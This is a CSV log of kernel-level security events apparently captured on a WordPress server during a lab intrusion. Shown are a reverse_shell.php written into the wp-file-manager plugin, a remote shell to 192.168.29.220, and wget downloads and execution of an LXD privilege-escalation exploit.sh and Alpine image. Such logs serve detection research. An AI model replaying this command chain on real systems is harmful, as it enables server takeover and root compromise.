TIME,UID,COMM,PID,TID,RET,EVENT,ARGS,CLASS
04:39:28:580104,33,xz,18170,18170,0,sched_process_exec,"cmdpath: /usr/bin/xz, pathname: /usr/bin/xz, dev: 8388611, inode: 1443190, ctime: 1721354246865957342, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [xz --version], interp: /usr/bin/xz, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:28:583474,33,sh,18171,18171,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c zip -h], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:28:584182,33,zip,18172,18172,0,sched_process_exec,"cmdpath: /usr/bin/zip, pathname: /usr/bin/zip, dev: 8388611, inode: 1443211, ctime: 1721354246873955972, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [zip -h], interp: /usr/bin/zip, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:28:587343,33,sh,18173,18173,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c unzip --help], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:28:587961,33,unzip,18174,18174,0,sched_process_exec,"cmdpath: /usr/bin/unzip, pathname: /usr/bin/unzip, dev: 8388611, inode: 1443060, ctime: 1721354246761975155, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [unzip --help], interp: /usr/bin/unzip, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:28:591547,33,sh,18175,18175,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c rar --version], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:28:594070,33,sh,18176,18176,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c unrar], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:28:596994,33,sh,18177,18177,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c 7za], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:28:600181,33,sh,18178,18178,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c ffmpeg -version], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:28:606821,33,apache2,16039,16039,0,security_inode_unlink,"pathname: /srv/www/wordpress/wp-content/plugins/wp-file-manager/lib/files/reverse_shell.php, inode: 791017, dev: 8388611, ctime: 1740733711609527735",5
04:39:28:607225,33,apache2,16039,16039,0,chown,"pathname: /srv/www/wordpress/wp-content/plugins/wp-file-manager/lib/files/reverse_shell.php, owner: 33, group: 33",5
04:39:28:607255,33,apache2,16039,16039,0,chmod,"pathname: /srv/www/wordpress/wp-content/plugins/wp-file-manager/lib/files/reverse_shell.php, mode: S_IFREG|S_IRUSR|S_IWUSR",5
04:39:28:607269,33,apache2,16039,16039,0,security_inode_unlink,"pathname: /tmp/systemd-private-9e6e279e2cd6463db6084d90bb9fe4e3-apache2.service-VtkoMS/tmp/phpnbvtAz, inode: 917576, dev: 8388611, ctime: 1740735568603034765",5
04:39:28:607305,33,apache2,16039,16039,0,chmod,"pathname: /srv/www/wordpress/wp-content/plugins/wp-file-manager/lib/files/reverse_shell.php, mode: S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH",5
04:39:28:608336,33,apache2,16039,16039,0,security_inode_unlink,"pathname: /srv/www/wordpress/wp-content/plugins/wp-file-manager/lib/php/.tmp/elfreq17457a1fe6959, inode: 791015, dev: 8388611, ctime: 1740735568602034756",5
04:39:28:608601,33,apache2,16039,16039,0,security_inode_unlink,"pathname: /srv/www/wordpress/wp-content/plugins/wp-file-manager/lib/php/.tmp/l1_Lw.lock, inode: 791016, dev: 8388611, ctime: 1740735568602034756",5
04:39:29:628387,33,apache2,16534,16534,0,security_socket_connect,"sockfd: 12, type: SOCK_STREAM, remote_addr: map[sa_family:AF_INET sin_addr:192.168.29.220 sin_port:11850]",5
04:39:29:634530,33,sh,18179,18179,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -c uname -a; w; id; sh -i], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",5
04:39:29:637321,33,uname,18180,18180,0,sched_process_exec,"cmdpath: /usr/bin/uname, pathname: /usr/bin/uname, dev: 8388611, inode: 1443044, ctime: 1721354246753976525, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [uname -a], interp: /usr/bin/uname, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:29:639174,33,w,18181,18181,0,sched_process_exec,"cmdpath: /usr/bin/w, pathname: /usr/bin/w, dev: 8388611, inode: 1443089, ctime: 1721354246793969675, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [w], interp: /usr/bin/w, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:29:641251,33,w,18181,18181,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:29:641313,33,w,18181,18181,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:29:653157,33,id,18182,18182,0,sched_process_exec,"cmdpath: /usr/bin/id, pathname: /usr/bin/id, dev: 8388611, inode: 1442354, ctime: 1721354245934117240, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [id], interp: /usr/bin/id, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:29:653903,33,id,18182,18182,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:29:653955,33,id,18182,18182,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:29:654053,33,id,18182,18182,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:29:654085,33,id,18182,18182,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:29:654514,33,sh,18183,18183,0,sched_process_exec,"cmdpath: /usr/bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [sh -i], interp: /usr/bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:136756,33,awk,18186,18186,0,sched_process_exec,"cmdpath: /usr/bin/awk, pathname: /usr/bin/mawk, dev: 8388611, inode: 1442516, ctime: 1721354246046097792, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [awk { print $3 }], interp: /usr/bin/awk, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:136827,33,grep,18185,18185,0,sched_process_exec,"cmdpath: /usr/bin/grep, pathname: /usr/bin/grep, dev: 8388611, inode: 1442243, ctime: 1721354245730152969, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [grep -e DocumentRoot -R /etc/apache2/sites-enabled/], interp: /usr/bin/grep, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:338293,33,wget,18187,18187,0,sched_process_exec,"cmdpath: /usr/bin/wget, pathname: /usr/bin/wget, dev: 8388611, inode: 1449210, ctime: 1721387193194059271, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [wget -O 41939_file.tar.gz 192.168.29.220:41939/alpine-v3.21-x86_64-20250225_2117.tar.gz], interp: /usr/bin/wget, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:344891,33,wget,18187,18187,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:30:344936,33,wget,18187,18187,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:30:345952,33,wget,18187,18187,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_INET sin_addr:192.168.29.220 sin_port:41939]",5
04:39:30:346278,33,wget,18187,18187,0,net_packet_http_request,"metadata: {192.168.29.168 192.168.29.220 33842 41939 6 227 any}, http_request: {GET HTTP/1.1 192.168.29.220:41939 /alpine-v3.21-x86_64-20250225_2117.tar.gz map[Accept:[*/*] Accept-Encoding:[identity] Connection:[Keep-Alive] User-Agent:[Wget/1.21.2]] 0}",5
04:39:30:347082,0,swapper/3,0,0,0,net_packet_http_response,"metadata: {192.168.29.220 192.168.29.168 41939 33842 6 249 any}, http_response: {200 OK 200 HTTP/1.0 map[Content-Length:[3868999] Content-Type:[application/gzip] Date:[Fri, 28 Feb 2025 09:39:30 GMT] Last-Modified:[Wed, 26 Feb 2025 02:17:55 GMT] Server:[SimpleHTTP/0.6 Python/3.11.9]] 3868999}",5
04:39:30:536409,33,wget,18188,18188,0,sched_process_exec,"cmdpath: /usr/bin/wget, pathname: /usr/bin/wget, dev: 8388611, inode: 1449210, ctime: 1721387193194059271, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [wget -O exploit.sh 192.168.29.220:41939/Privilege_Escalation_LXD/exploit.sh], interp: /usr/bin/wget, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:542554,33,wget,18188,18188,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:30:542665,33,wget,18188,18188,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:30:544273,33,wget,18188,18188,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_INET sin_addr:192.168.29.220 sin_port:41939]",5
04:39:30:545139,33,wget,18188,18188,0,net_packet_http_request,"metadata: {192.168.29.168 192.168.29.220 33856 41939 6 222 any}, http_request: {GET HTTP/1.1 192.168.29.220:41939 /Privilege_Escalation_LXD/exploit.sh map[Accept:[*/*] Accept-Encoding:[identity] Connection:[Keep-Alive] User-Agent:[Wget/1.21.2]] 0}",5
04:39:30:554054,0,swapper/3,0,0,0,net_packet_http_response,"metadata: {192.168.29.220 192.168.29.168 41939 33856 6 239 any}, http_response: {200 OK 200 HTTP/1.0 map[Content-Length:[1659] Content-Type:[text/x-sh] Date:[Fri, 28 Feb 2025 09:39:30 GMT] Last-Modified:[Thu, 21 Nov 2024 01:49:49 GMT] Server:[SimpleHTTP/0.6 Python/3.11.9]] 1659}",5
04:39:30:739351,33,chmod,18189,18189,0,sched_process_exec,"cmdpath: /usr/bin/chmod, pathname: /usr/bin/chmod, dev: 8388611, inode: 1441959, ctime: 1721354245342220923, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [chmod 755 ./exploit.sh], interp: /usr/bin/chmod, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:741159,33,chmod,18189,18189,0,fchmodat,"dirfd: -100, pathname: ./exploit.sh, mode: S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH, flags: 0",5
04:39:30:942106,33,exploit.sh,18190,18190,0,sched_process_exec,"cmdpath: ./exploit.sh, pathname: /usr/bin/env, dev: 8388611, inode: 1442077, ctime: 1721354245418207613, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [/usr/bin/env bash ./exploit.sh -f 41939_file.tar.gz], interp: /usr/bin/env, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",5
04:39:30:942728,33,bash,18190,18190,0,sched_process_exec,"cmdpath: /usr/bin/bash, pathname: /usr/bin/bash, dev: 8388611, inode: 1449823, ctime: 1721387570140135512, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [bash ./exploit.sh -f 41939_file.tar.gz], interp: /usr/bin/bash, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: exploit.sh, env: <nil>",5
04:39:30:943669,33,bash,18190,18190,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:30:943712,33,bash,18190,18190,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:30:945077,33,grep,18193,18193,0,sched_process_exec,"cmdpath: /usr/bin/grep, pathname: /usr/bin/grep, dev: 8388611, inode: 1442243, ctime: 1721354245730152969, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [grep privesc], interp: /usr/bin/grep, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: bash, env: <nil>",5
04:39:30:945673,33,lxc,18192,18192,0,sched_process_exec,"cmdpath: /snap/bin/lxc, pathname: /usr/bin/snap, dev: 8388611, inode: 1452119, ctime: 1722684139334017812, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [lxc list], interp: /snap/bin/lxc, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: bash, env: <nil>",5
04:39:30:946375,33,wc,18194,18194,0,sched_process_exec,"cmdpath: /usr/bin/wc, pathname: /usr/bin/wc, dev: 8388611, inode: 1443093, ctime: 1721354246793969675, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [wc -l], interp: /usr/bin/wc, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: bash, env: <nil>",5
04:39:30:965919,33,snap,18192,18192,0,sched_process_exec,"cmdpath: /snap/snapd/current/usr/bin/snap, pathname: /snap/snapd/23545/usr/bin/snap, dev: 7340045, inode: 34, ctime: 1733303621000000000, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [lxc list], interp: /snap/snapd/current/usr/bin/snap, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: lxc, env: <nil>",5
04:39:30:999809,33,snap-seccomp,18206,18206,0,sched_process_exec,"cmdpath: /snap/snapd/23545/usr/lib/snapd/snap-seccomp, pathname: /snap/snapd/23545/usr/lib/snapd/snap-seccomp, dev: 7340045, inode: 223, ctime: 1733303620000000000, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [/snap/snapd/23545/usr/lib/snapd/snap-seccomp version-info], interp: /snap/snapd/23545/usr/lib/snapd/snap-seccomp, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:117626,33,getent,18213,18213,0,sched_process_exec,"cmdpath: /usr/bin/getent, pathname: /usr/bin/getent, dev: 8388611, inode: 1457864, ctime: 1739099237752710382, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [getent passwd 33], interp: /usr/bin/getent, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:119344,33,getent,18213,18213,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:119393,33,getent,18213,18213,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:120807,33,getent,18214,18214,0,sched_process_exec,"cmdpath: /usr/bin/getent, pathname: /usr/bin/getent, dev: 8388611, inode: 1457864, ctime: 1739099237752710382, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [getent passwd 33], interp: /usr/bin/getent, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:121669,33,getent,18214,18214,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:121712,33,getent,18214,18214,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:122436,33,getent,18215,18215,0,sched_process_exec,"cmdpath: /usr/bin/getent, pathname: /usr/bin/getent, dev: 8388611, inode: 1457864, ctime: 1739099237752710382, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [getent passwd 33], interp: /usr/bin/getent, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:122832,33,getent,18215,18215,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:122902,33,getent,18215,18215,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:129083,33,snap-confine,18192,18192,0,sched_process_exec,"cmdpath: /snap/snapd/23545/usr/lib/snapd/snap-confine, pathname: /snap/snapd/23545/usr/lib/snapd/snap-confine, dev: 7340045, inode: 210, ctime: 1733303620000000000, inode_mode: 35309, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [/snap/snapd/23545/usr/lib/snapd/snap-confine --base core22 snap.lxd.lxc /usr/lib/snapd/snap-exec lxd.lxc list], interp: /snap/snapd/23545/usr/lib/snapd/snap-confine, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: snap-confine, env: <nil>",5
04:39:31:151542,33,snap-confine,18192,18192,0,setns,"fd: 6, nstype: 131072",5
04:39:31:151637,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 0, sgid: -1",5
04:39:31:151696,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 33, sgid: -1",5
04:39:31:151705,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 0, sgid: -1",5
04:39:31:151717,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 33, sgid: -1",5
04:39:31:152139,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 0, sgid: -1",5
04:39:31:152195,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 33, sgid: -1",5
04:39:31:152541,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 0, sgid: -1",5
04:39:31:152595,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 33, sgid: -1",5
04:39:31:152606,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 0, sgid: -1",5
04:39:31:152633,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 33, sgid: -1",5
04:39:31:153714,33,snap-confine,18217,18217,0,setns,"fd: 8, nstype: 131072",5
04:39:31:154691,33,snap-confine,18192,18192,0,setns,"fd: 8, nstype: 131072",5
04:39:31:163871,33,snap-confine,18192,18192,0,setresgid,"rgid: -1, egid: 33, sgid: -1",5
04:39:31:163908,33,snap-confine,18192,18192,0,setresuid,"ruid: -1, euid: 33, suid: -1",5
04:39:31:165656,33,lxc,18219,18219,0,sched_process_exec,"cmdpath: /snap/bin/lxc, pathname: /usr/bin/snap, dev: 8388611, inode: 1452119, ctime: 1722684139334017812, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [lxc image import 41939_file.tar.gz --alias alpine], interp: /snap/bin/lxc, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: bash, env: <nil>",5
04:39:31:178726,33,snap,18219,18219,0,sched_process_exec,"cmdpath: /snap/snapd/current/usr/bin/snap, pathname: /snap/snapd/23545/usr/bin/snap, dev: 7340045, inode: 34, ctime: 1733303621000000000, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [lxc image import 41939_file.tar.gz --alias alpine], interp: /snap/snapd/current/usr/bin/snap, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: lxc, env: <nil>",5
04:39:31:191129,33,snap-seccomp,18231,18231,0,sched_process_exec,"cmdpath: /snap/snapd/23545/usr/lib/snapd/snap-seccomp, pathname: /snap/snapd/23545/usr/lib/snapd/snap-seccomp, dev: 7340045, inode: 223, ctime: 1733303620000000000, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [/snap/snapd/23545/usr/lib/snapd/snap-seccomp version-info], interp: /snap/snapd/23545/usr/lib/snapd/snap-seccomp, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:195563,33,getent,18237,18237,0,sched_process_exec,"cmdpath: /usr/bin/getent, pathname: /usr/bin/getent, dev: 8388611, inode: 1457864, ctime: 1739099237752710382, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [getent passwd 33], interp: /usr/bin/getent, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:196048,33,getent,18237,18237,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:196089,33,getent,18237,18237,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:204139,33,getent,18239,18239,0,sched_process_exec,"cmdpath: /usr/bin/getent, pathname: /usr/bin/getent, dev: 8388611, inode: 1457864, ctime: 1739099237752710382, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [getent passwd 33], interp: /usr/bin/getent, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:204560,33,getent,18239,18239,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:204601,33,getent,18239,18239,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:205204,33,getent,18240,18240,0,sched_process_exec,"cmdpath: /usr/bin/getent, pathname: /usr/bin/getent, dev: 8388611, inode: 1457864, ctime: 1739099237752710382, inode_mode: 33261, interpreter_pathname: <nil>, interpreter_dev: <nil>, interpreter_inode: <nil>, interpreter_ctime: <nil>, argv: [getent passwd 33], interp: /usr/bin/getent, stdin_type: S_IFCHR, stdin_path: /dev/null, invoked_from_kernel: 0, prev_comm: snap, env: <nil>",5
04:39:31:205594,33,getent,18240,18240,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
04:39:31:205633,33,getent,18240,18240,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",5
